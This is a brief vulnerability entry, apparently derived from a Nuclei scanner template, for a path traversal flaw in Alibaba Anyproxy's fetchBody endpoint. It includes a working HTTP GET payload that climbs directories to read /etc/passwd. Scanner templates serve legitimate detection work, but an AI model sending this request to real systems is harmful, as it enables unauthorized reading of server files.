# Vulnerability: Alibaba Anyproxy fetchBody File - Path Traversal
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`alibaba-anyproxy-lfi.yaml`)

## Description
Alibaba Anyproxy is vulnerable to Path Traversal.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/fetchBody?id=1/../../../../../../../../etc/passwd
```

